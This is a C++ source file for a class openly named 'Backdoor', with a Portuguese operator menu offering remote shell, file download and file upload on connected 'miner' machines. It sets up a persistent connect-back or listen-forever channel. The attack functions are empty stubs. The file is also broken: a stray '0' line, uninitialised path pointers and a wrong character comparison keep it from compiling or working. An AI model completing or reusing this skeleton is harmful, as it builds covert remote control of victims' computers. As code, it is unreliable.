#include "backdoor.h"

void Backdoor::shell(){
    if(this->is_server){

    }else{

    }
}


void Backdoor::upload(char * path){
    if(this->is_server){

    }else{

    }
}


void Backdoor::download(char *path){
    if(this->is_server){

    }else{

    }
}


std::string Backdoor::get_miner_id(){
    return c->connection_id();
}


std::string Backdoor::get_miner_ip(){
    return c->connection_ip();
}


void Backdoor::menu(){
    int choice;
    std::cout << "MINER_ID = " << b.get_miner_id() << "IP = \n" << b.get_miner_ip() << std::endl;
0
    std::cout << "Operações : " << std::endl;

    std::cout << "1) Shell\n2) Download\n3)Upload" << std::endl;

    choice = std::cin.get();


    if(choice == 1){
        b.shell();
    
    }else if(choice == 2){
        char * path;
        b.download(path);


    }else if(choice == 3){
        char *path;
    
        b.upload(path);
    
    }else{
        std::cout << "Comando inválido" << std::endl;
    }
}

Backdoor::Backdoor(char *ip, int port, bool is_server){
    this->c = new Communication(ip, port);
    this->is_server = is_server;
    
    if(is_server){
        this->c->listen_forever();

    }else{
        this->c->connect_forever();
    }
}

